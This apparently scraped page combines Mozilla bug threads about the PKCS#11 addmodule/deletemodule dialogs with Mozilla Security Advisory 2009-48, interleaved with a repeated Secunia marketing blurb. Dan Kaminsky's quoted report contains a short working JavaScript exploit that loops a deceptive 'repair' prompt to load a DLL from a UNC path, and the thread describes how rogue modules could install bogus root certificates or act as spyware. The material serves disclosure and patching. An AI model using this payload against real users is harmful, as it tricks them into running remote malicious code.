How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Attached file
[Module runs calc.exe when loaded](attachment.cgi?id=393517)
— [Details](attachment.cgi?id=393517&action=edit)

Dan Kaminsky reported this issue. His full email to security@m.o:
You have a Javascript function that takes a DLL or a .so file as an argument in all builds of Firefox below 3.5?
Really?
Apparently this has garnered some internal attention over the last three years -- saw [https://bugzilla.mozilla.org/show\_bug.cgi?id=326628](/show_bug.cgi?id=326628 "RESOLVED FIXED - Dialogs for pkcs11.addmodule and pkcs11.deletemodule are too jargony") .
You guys sort of found that this can be thrown into a while(1) loop, but didn't realize it's a fully modal dialog and so all of Firefox is locked until the user hits OK.
What was really missed, however, was the fact that on Windows a UNC path can be used as an argument to LoadLibrary. So the DLL can be loaded from a remote source.
Exploit looks like this:
<body>
<script>
var str = "Error detected in Firefox Module NSP31337.bin.\n" +
"Please click 'OK' to repair."
ret=-2;
while(ret!=-5){
ret=window.pkcs11.addmodule("\n\n\n" + str + "\n\n\n", "\\\\127.0.0.1\\c$\\pkunkcs", 0, 0);
}
</script>
pkunkcs attached, launches calc.exe. Obviously the path doesn't need to loop back to 127.0.0.1 .

Isn't this just a straight duplicate of [bug 326628](/show_bug.cgi?id=326628 "RESOLVED FIXED - Dialogs for pkcs11.addmodule and pkcs11.deletemodule are too jargony")? Other than "backport [bug 326628](/show_bug.cgi?id=326628 "RESOLVED FIXED - Dialogs for pkcs11.addmodule and pkcs11.deletemodule are too jargony") to the 1.9.0 branch" I'm not sure what the expected resolution would be.Whiteboard: [sg:moderate?] requires user accepting a prompt... seemingly a dup of bug 326628

That's what Nelson said, too.
We missed the UNC path issue which makes it sg:critical rather than sg:moderate ([bug 326628 comment 23](/show_bug.cgi?id=326628#c23 "RESOLVED FIXED - Dialogs for pkcs11.addmodule and pkcs11.deletemodule are too jargony")).

Why is it sg:critical? It can't be exploited without explicit user interaction.

Between the prompt being confusing and the attacker being able to put the prompt in a while(1) loop, I imagine it would have a pretty high chance of success.

I agree with Benjamin that this is "just a straight duplicate of [bug 326628](/show_bug.cgi?id=326628 "RESOLVED FIXED - Dialogs for pkcs11.addmodule and pkcs11.deletemodule are too jargony")"
and that the solution is "backport [bug 326628](/show_bug.cgi?id=326628 "RESOLVED FIXED - Dialogs for pkcs11.addmodule and pkcs11.deletemodule are too jargony") to the 1.9.0 branch".
The original design intent of the facilities for adding new PKCS#11
modules to the mozilla browser was to offer two separate methods:
1) a UI dialog in the security manager preferences by which the user could
do all the work for himself,
2) a javascript method invokable from an XPI installer, by which the developer
of the module could do the work for the user.
<https://developer.mozilla.org/en/PKCS11_Module_Installation> provides minimal
information about both methods.
We expected that most PKCS#11 modules would be installed via an XPI.
Somehow, somewhere along the way, it became possible to invoke the javascript
method from a web page, and developers of deployments of PKCS#11 modules
began to rely on that. But that was vulnerable, and now that has been taken
away, leaving developers wondering what to do instead.
IMO, the right thing to do is to steer those developers back to developing
XPIs, rather than trying to teach users how to find and use the UI for this
installation. We really should encourage developers to consider the XPI
as the primary vehicle for that installation, IMO.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# Mozilla Foundation Security Advisory 2009-48

## Insufficient warning for PKCS11 module installation and removal

Announced
September 9, 2009
Reporter
Jesse Ruderman, Dan Kaminsky
Impact
Moderate
Products
Firefox
Fixed in

* Firefox 3.0.14

### Description

Mozilla security researcher **Jesse Ruderman** reported
that when security modules were added or removed
via `pkcs11.addmodule` or `pkcs11.deletemodule`,
the resulting dialog was not sufficiently informative. Without
sufficient warning, an attacker could entice a victim to install a
malicious PKCS11 module and affect the cryptographic integrity of the
victim's browser.

Security researcher **Dan Kaminsky** reported that
this issue had not been fixed in Firefox 3.0 and that under certain
circumstances `pkcs11` modules could be installed from a
remote location.

Firefox 3.5 releases are not affected.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

To reproduce:
1. javascript:pkcs11.deletemodule("foopy");
Result:
A dialog that has no protection against [bug 162020](/show_bug.cgi?id=162020 "RESOLVED FIXED - pop up XPInstall/security dialog when user is about to click")-style attacks and asks a question that doesn't mean anything to me:
Confirm
Are you sure you want to delete this security module?
Module name: foopy
Expected:
A dialog that makes sense and protects against 162020-style attacks if necessary, or no dialog.

Jesse, what wording would make sense to you?
I'm fine with the idea to add a delay to that dialog, if it's generated from JavaScript.
I don't understand why you added [comment 1](/show_bug.cgi?id=326628#c1 "RESOLVED FIXED - Dialogs for pkcs11.addmodule and pkcs11.deletemodule are too jargony"), because it repeats the function stated in [comment 0](/show_bug.cgi?id=326628#c0 "RESOLVED FIXED - Dialogs for pkcs11.addmodule and pkcs11.deletemodule are too jargony"), did you intend to mention an additional function?
I am fine to add a small delay before the button can be pressed, if you think it makes sense.

I have no idea what the dialogs do, so I can't suggest a better wording.

Bob, please correct me if I'm wrong.
> What could a malicious page do if it could get you to add a module through
> addmodule? Could it take over your computer?
Besides adding a module, an attacker would have do to one more thing: Install a malicious executable shared library / dll on the user's machine, which contains the entry points expected by NSS.
If such a library gets installed and added to the user's profile using addmodule(), NSS will call functions on the library. That code will run with the user's permissions on the operating system level.
> What could a malicious page do if it could get you to remove an existing
> module, especially in a default mozilla.org build of Firefox?
According to security device manager in preferences, a default profile has 3 modules in NSS enabled, a crypto service (probably for providing functionality), the software security device (which contains the user's private keys, probably cert trust settings, etc. and is protected by the master password), and the builtins, which contains the list of root CA certificates and their default trust.
I don't know whether deletemodule() can be used to disable these modules. Bob can probably answer this question immediately.
If a malicious site were able to delete/disable these modules, this would qualify as a denial of service, as the user would no longer be able to perform security functionality like https/SSL using the profile.

An Attacker who can get his own PKCS11 module installed into a mozilla-family
product has the ability to run any code with the user's privileges. But
with specific relevance to crypto security, it could:
a) install its own bogus root CA certs, thereby facilitating huge MITM attacks.
b) be an MITM right inside the browser, copying the encrypted or decrypted
plaintext into storage, and later send that captured text to its home server.
This would be spyware that saw all the user's supposedly encrypted and secure
SSL (https, imaps, smtps, etc.) data.
There is a company that produced a module to do exactly those things for MSIE.
So, the threat of this is not merely hypothetical.

I don't see any text changes in the cards for 1.8.0.x releases. [bug 328771](/show_bug.cgi?id=328771 "RESOLVED FIXED - pkcs11.addmodule needs to protect against bug 162020-style attacks") will have to be protection enough. If you want to fix this by blocking these highly specialized functions that are useless to most people then we could do that on the branch -- but I doubt that's the approach the crypto team wants to take.Flags: blocking1.8.0.2? → blocking1.8.0.2-

Being a non english speaker, I guess "to not see in the cards" has the meaning of "to not consider it doable".
I think it's a good idea to come up with better wording for add/delete dialogs.
Instead of
"Are you sure you want to delete this security module?"
what about
"A security module is software that provides additional
functionality on your computer, often used to access special
security hardware like smart cards.
Are you sure you want to disable this security software?"
Instead of
"Are you sure you want to install this security module?"
I propose using the same new wording as above,
but changing "disable" to "install".
Should we ask Mike Beltzner to help out with better wordings?

I suggest changing "security module" to "crypto module"
or "cryptographic module". The word "security" can mean
anything from anti-virus to crypto.

I think the addmodule dialog should just be the extension-installation dialog. The fact that it \*claims\* to be a cryptographic module is irrelevant to whether you trust the site enough to let it install software with your privileges.
The extension installation dialog contains these sentences, which are all relevant:
"A web site is requesting permission to install the following item..."
"Malicious software can damage your computer or violate your privacy."
"You should only install software from sources that you trust."

Jesse, I can't find a way to easily reuse this dialog from within PSM.
While I found an interface that embeddors can use to replace our internal dialog with a different, it seems there is no interface to use XPInstall's implementation from another XPCOM module.
Should somebody work on XPInstall to make it available using a new interface?

I don't know how I could easily implement Jesse's proposal to use the general software install dialog, as I can't find the necessary interfaces, and I think adding interfaces is not appropriate for 1.5.0.x. I guess nobody has suggestions to my [comment 17](/show_bug.cgi?id=326628#c17 "RESOLVED FIXED - Dialogs for pkcs11.addmodule and pkcs11.deletemodule are too jargony")?
If you confirm my understanding is right, we could go back to come up with better wordings, see [comment 12](/show_bug.cgi?id=326628#c12 "RESOLVED FIXED - Dialogs for pkcs11.addmodule and pkcs11.deletemodule are too jargony") and [comment 13](/show_bug.cgi?id=326628#c13 "RESOLVED FIXED - Dialogs for pkcs11.addmodule and pkcs11.deletemodule are too jargony").

We definitely want to minimize changes on the stable branch. Interface changes are definitely not allowed, but interface additions are possible -- yet they should be avoided in general. We also don't want to change the text that is localized because that involves too much coordination amongst the localizers.
Taking those into consideration, how important is it that we try to fix this for a 1.8.0.x release? Given that the OK button has a timer on it, isn't most of the problem described in the original bug report avoided? Perhaps we should simply focus on a better solution for FF2.

From the comments its still not clear to me whether addmodule can result in remote installation of malicious code, or only load local modules. If the former then this is a critical bug (remote site can just force the user into an addmodule dialog loop).

Combined with another bug that allows an attacker to force a download to a known location--and we've had those bugs in the past--this becomes a remote risk. Even without a "bug" the default download location is easily guessed for most windows users who run the "Home" versions of the OS.
I can't think of any legitimate reason for a \_web page\_ to need this functionality.Assignee: benjamin → kaie

pkcs providers must not be installed by content, rev. 1
I agree, unless there's a \*really\* good reason Joe Webdeveloper needs the ability to install/remove modules here, this needs to go.

I have asked several people by email whether this functionality is anything currently required/expected by products, and whether there is a need to veto this patch, or find a different approach. I don't expect to be one, but wanted to be certain. I've asked them to comment in the bug. I'll review the patch after I have feedback.

This feature was carried forward from the old Communicator 4.0 days. The JavaScript function was to aid PKCS #11 developers in building automatic Jar installation tools. Some also wrote 'web scripts' which would allow installation of PKCS #11 modules because this API more control over the configuration than the existing PCKS #11 installer UI built into PSM.
Moving this function from the crypto object to chrome should not cause problems in creating replacements for these tools. We just need to document how one would use an xpi file to install a PKCS #11 module, and we probably should write a plugin that imitates what those scripts used to do.
The crypto object wiki documentation should also be updated.
In short, since the patch retains the functionality, only moving it to Chrome, and since the number of these jar installers and scripts (I don't even know if the latter works anymore in the Firefox world) is almost certainly small and can be replaced, the benefits of this patch greatly outweigh the costs.

To add to Bob's comment: I believe the feature was intended to work in
javascripts that were part of jar (now XPI) installers, not in ordinary
web pages. If the feature could be retained in XPI installers, but not
in web pages, I think that would minimize the breakage. I think we really
do not want to suddenly break all (or even most) of the XPI installers that
install PKCS#11 crypto modules into Firefox. While relatively unknown in
the USA, these are widely used in some European countries.

Just to follow up to comments via email: the window object was never available to XPI/JAR installers, and so this will not be a regression for them. And in any case, we no longer run scripts for extension installs.

pkcs providers must not be installed by content, rev. 1
I understand the functionality is risky and both Bob and Nelson are OK with the plan to remove the functionality for web sites. I agree that a prompt is no longer necessary to warn the user.
Patch looks good to me.
Should we remove the obsolete strings from the bundle?
We need to update the documentation as requested by Bob, announcing that this functionality will go away.

This is the branch patch. It appears to be fine, except I get the following warning when I run a build with this patch:
WARNING: nsDOMClassInfo::Finalize Don't call me!: file ../../../../src/dom/src/base/nsDOMClassInfo.cpp, line 4033
Is there some other aspect of dom classinfo that I need to keep in sync that I don't know about?

Uh, I can't see how this patch would have anything to do with finalize hooks in any way. Are you sure the error you're seeing is only apparent with this patch? I know there are some differences on trunk/branch regarding finalization of DOM stuff, so I would guess that what you're seeing is unrelated to this patch. If this is specific to this patch, can you find out what class we're finalizing when you see that error (by inspecting mData or what not)?

I definitely understand backing it out, since breaking our dialogs isn't a good thing, and this isn't a good time to argue about what specific strings we should take/leave. But this is still an sg:moderate blocker bug with an exploit.
Could we do something more reduced, like just removing the ability for content JS to invoke these, while preserving business as usual for chrome? Benjamin, do you already have an alternative plan in mind?

I'm sure there is a way to block content but not chrome from using this API, but I don't know what it is, and it would probably be simpler to remove the API again while solving the UI issues raised in [bug 494899](/show_bug.cgi?id=494899 "RESOLVED FIXED - \"Load PKCS#11 Device\" dialog doesn't work (pkcs11.addmodule call fails)").
In any case I don't think this needs to be a release blocker at this point.

This patch doesn't provide the old diversity of error messages when removing a module. I think it's acceptable to drop the message about invalid module name, because that only is when the param is empty...
But I would have preferred to keep the old success message, that will either say "deleted internal" or "deleted external" module.
Why don't we simply keeping the old of code inside nsPkcs11::DeleteModule that shows up the success messages? We can revisit at a later time if we should drop them.
In other words, where the old code had:
if (srv == SECSuccess) {
...
- if (modType == SECMOD\_EXTERNAL) {
- nssComponent->GetPIPNSSBundleString("DelModuleExtSuccess", errorMessage);
- \*aReturn = JS\_OK\_DEL\_EXTERNAL\_MOD;
- } else {
- nssComponent->GetPIPNSSBundleString("DelModuleIntSuccess", errorMessage);
- \*aReturn = JS\_OK\_DEL\_INTERNAL\_MOD;
- }
can we do this?
if (srv == SECSuccess) {
...
if (modType == SECMOD\_EXTERNAL) {
nssComponent->GetPIPNSSBundleString("DelModuleExtSuccess", errorMessage);
alertUser(errorMessage.get());
} else {
nssComponent->GetPIPNSSBundleString("DelModuleIntSuccess", errorMessage);
alertUser(errorMessage.get());
}
Do you want to remove file nsIDOMPkcs11.idl ?
It seems in your new patch you keep it.
I leave it you to you address my proposal to keep the "2 different success messages on delete", but I'd really prefer it.

Where is the documentation for a workaround?!? This came as a VERY BAD news for us. In Europe Estonia is not the only country using ID-cards. And removing this functionality without any info about workaround is a very-very bad practice!
<https://ideelabor.ee/opensource/wiki/IdKaardiTarkvara/VeebisAutentimineMozillaga> - this page is usless for Firefox 3.5. How can we do the same thing with xpi?
Dumbuser can't find even device manager.. How should they find correct module to load?!
I'm really waiting for GOOD documentation as this is a release blocker for Estonia and other countries using smart cards.Status: RESOLVED → REOPENEDResolution: FIXED → ---

Sander, could you please file a new bug for that, and request blocking1.9.1?
Reopening a fixed bug is not the proper way to register the complaint (they're easy to miss, particularly since this one is already marked fixed1.9.1).Status: REOPENED → RESOLVEDClosed: 16 years ago → 16 years agoResolution: --- → FIXED

Verified for 1.9.0.14 if the proper result is no dialog when doing javascript:pkcs11.deletemodule("foopy");
Can someone confirm that is the desired behavior?
